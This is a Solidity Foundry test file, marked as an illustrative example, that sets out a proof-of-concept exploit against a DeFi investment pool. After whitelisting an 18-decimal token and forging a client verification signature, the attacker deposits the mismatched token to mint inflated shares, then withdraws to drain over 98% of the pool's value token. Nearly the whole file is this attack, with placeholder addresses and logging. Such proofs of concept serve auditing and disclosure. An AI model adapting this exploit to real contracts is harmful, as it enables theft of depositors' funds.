```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// ILLUSTRATIVE EXAMPLE

import {Test, console2} from "forge-std/Test.sol";

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IExampleCore {
    function whitelistValueTokens(address[] calldata _tokens) external;
    function updatePermissions(address _user, uint256 _newPermissionsMask) external;
    function isValueTokenWhitelisted(address token) external view returns (bool);
    function priceOracle() external view returns (address);
    function postActionDelay() external view returns (uint256);
}

interface IExamplePool {
    struct ClientVerification {
        bytes signature;
        uint128 validTill;
        uint8 tier;
    }

    struct WithdrawRequest {
        uint256 sharesToBurn;
        uint256 minOutputAmount;
        bytes32 salt;
        address poolAddr;
    }

    struct SignedWithdrawalRequest {
        WithdrawRequest body;
        bytes signature;
    }

    function depositForToken(uint256 _amountToInvest, ClientVerification calldata, address bearerToken) external;
    function withdraw(SignedWithdrawalRequest calldata) external;
    function valueToken() external view returns (address);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function getTotalCost() external view returns (uint256);
    function status() external view returns (uint8);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function ufarmFund() external view returns (address);
}

struct DataItem {
    uint256 timestamp;
    bytes32 feedId;
    bytes value;
}

interface IExamplePoolCallback {
    function quexCallback(uint256 receivedRequestId, DataItem memory response) external;
}

contract Example_PoolDrainTheft is Test {
    address constant PROTOCOL_CORE = address(0x3001);
    address constant PROTOCOL_CORE_OWNER = address(0x3002);
    address constant POOL = address(0x3003);
    address constant ORACLE_CALLBACK_SENDER = address(0x3004);
    address constant POOL_VALUE_TOKEN = address(0x3005);
    address constant INFLATION_TOKEN = address(0x3006);

    uint8 constant PERM_MEMBER = 0;
    uint8 constant PERM_VERIFY_CLIENT = 14;
    uint256 constant POOL_REQUEST_ID_SLOT = 525;

    bytes32 constant CLIENT_VERIFICATION_TYPEHASH =
        keccak256("ClientVerification(address investor,uint8 tier,uint128 validTill)");
    bytes32 constant WITHDRAW_TYPEHASH =
        keccak256("WithdrawRequest(uint256 sharesToBurn,bytes32 salt,address poolAddr,uint256 minOutputAmount)");

    IExamplePool pool = IExamplePool(POOL);

    address attacker;
    uint256 attackerPk;
    address verifier;
    uint256 verifierPk;

    uint256 constant BLOCK_WITH_VULNERABLE_STATE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), BLOCK_WITH_VULNERABLE_STATE);

        (attacker, attackerPk) = makeAddrAndKey("attacker");
        (verifier, verifierPk) = makeAddrAndKey("kycVerifier");

        assertEq(pool.valueToken(), POOL_VALUE_TOKEN, "valueToken wrong");
        assertEq(IERC20Min(POOL_VALUE_TOKEN).decimals(), 6, "value token decimals");
        assertEq(IERC20Min(INFLATION_TOKEN).decimals(), 18, "inflation token decimals");
        assertFalse(IExampleCore(PROTOCOL_CORE).isValueTokenWhitelisted(INFLATION_TOKEN), "pre-whitelisted");
    }

    function test_depositForTokenDecimalMismatchMintsInflatedShares() public {
        uint256 preTotalCost = pool.getTotalCost();
        uint256 prePoolValueToken = IERC20Min(POOL_VALUE_TOKEN).balanceOf(POOL);

        address[] memory valueTokens = new address[](1);
        valueTokens[0] = INFLATION_TOKEN;
        vm.prank(PROTOCOL_CORE_OWNER);
        IExampleCore(PROTOCOL_CORE).whitelistValueTokens(valueTokens);

        uint256 verifierMask = (uint256(1) << PERM_MEMBER) | (uint256(1) << PERM_VERIFY_CLIENT);
        vm.prank(PROTOCOL_CORE_OWNER);
        IExampleCore(PROTOCOL_CORE).updatePermissions(verifier, verifierMask);

        uint256 depositAmount = 1e12;
        deal(INFLATION_TOKEN, attacker, depositAmount);
        vm.prank(attacker);
        IERC20Min(INFLATION_TOKEN).approve(POOL, type(uint256).max);

        IExamplePool.ClientVerification memory verif = _signClientVerification(
            attacker,
            5,
            uint128(block.timestamp + 1 hours)
        );

        // Short-circuit sendQuexRequest so the test does not depend on the live
        // oracle request-registry creating a new request id.
        vm.store(POOL, bytes32(POOL_REQUEST_ID_SLOT), bytes32(uint256(1)));

        vm.prank(attacker);
        pool.depositForToken(depositAmount, verif, INFLATION_TOKEN);

        DataItem memory depositNav = DataItem({
            timestamp: block.timestamp,
            feedId: bytes32(0),
            value: abi.encode(preTotalCost)
        });
        vm.prank(ORACLE_CALLBACK_SENDER);
        IExamplePoolCallback(POOL).quexCallback(1, depositNav);

        uint256 attackerShares = pool.balanceOf(attacker);
        uint256 postDepositSupply = pool.totalSupply();

        console2.log("attacker inflation token spent raw", depositAmount);
        console2.log("attacker shares minted", attackerShares);
        console2.log("pool totalSupply after", postDepositSupply);
        console2.log("attacker ownership bps", (attackerShares * 10_000) / postDepositSupply);

        assertGt(attackerShares * 100 / postDepositSupply, 90, "ownership under 90%");

        uint256 sharesToBurn = (prePoolValueToken * postDepositSupply * 999) / (preTotalCost * 1000);
        IExamplePool.SignedWithdrawalRequest memory signed = _signWithdraw(
            IExamplePool.WithdrawRequest({
                sharesToBurn: sharesToBurn,
                minOutputAmount: 0,
                salt: bytes32(uint256(0xdeadbeef)),
                poolAddr: POOL
            })
        );

        vm.prank(attacker);
        pool.withdraw(signed);

        vm.warp(block.timestamp + 2 days + 1);

        vm.prank(attacker);
        pool.withdraw(signed);

        vm.store(POOL, bytes32(POOL_REQUEST_ID_SLOT), bytes32(uint256(2)));

        vm.prank(attacker);
        pool.withdraw(signed);

        DataItem memory withdrawNav = DataItem({
            timestamp: block.timestamp,
            feedId: bytes32(0),
            value: abi.encode(preTotalCost)
        });
        vm.prank(ORACLE_CALLBACK_SENDER);
        IExamplePoolCallback(POOL).quexCallback(2, withdrawNav);

        uint256 attackerValueToken = IERC20Min(POOL_VALUE_TOKEN).balanceOf(attacker);
        uint256 poolValueTokenAfter = IERC20Min(POOL_VALUE_TOKEN).balanceOf(POOL);

        console2.log("attacker value token gained", attackerValueToken);
        console2.log("pool value token idle before", prePoolValueToken);
        console2.log("pool value token idle after", poolValueTokenAfter);
        console2.log("ratio stolen over deposited 1e18", (attackerValueToken * 1e18) / depositAmount);

        assertGt(attackerValueToken, (prePoolValueToken * 98) / 100, "drain below 98%");
        assertEq(IERC20Min(INFLATION_TOKEN).balanceOf(attacker), 0, "inflation token not spent");
        assertLe(poolValueTokenAfter, prePoolValueToken / 50, "pool value token not drained");
    }

    function _signClientVerification(
        address investor,
        uint8 tier,
        uint128 validTill
    ) internal view returns (IExamplePool.ClientVerification memory) {
        bytes32 structHash = keccak256(abi.encode(CLIENT_VERIFICATION_TYPEHASH, investor, tier, validTill));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", pool.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(verifierPk, digest);
        return IExamplePool.ClientVerification({signature: abi.encodePacked(r, s, v), validTill: validTill, tier: tier});
    }

    function _signWithdraw(IExamplePool.WithdrawRequest memory body)
        internal
        view
        returns (IExamplePool.SignedWithdrawalRequest memory)
    {
        bytes32 structHash = keccak256(
            abi.encode(WITHDRAW_TYPEHASH, body.sharesToBurn, body.salt, body.poolAddr, body.minOutputAmount)
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", pool.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        return IExamplePool.SignedWithdrawalRequest({body: body, signature: abi.encodePacked(r, s, v)});
    }
}
```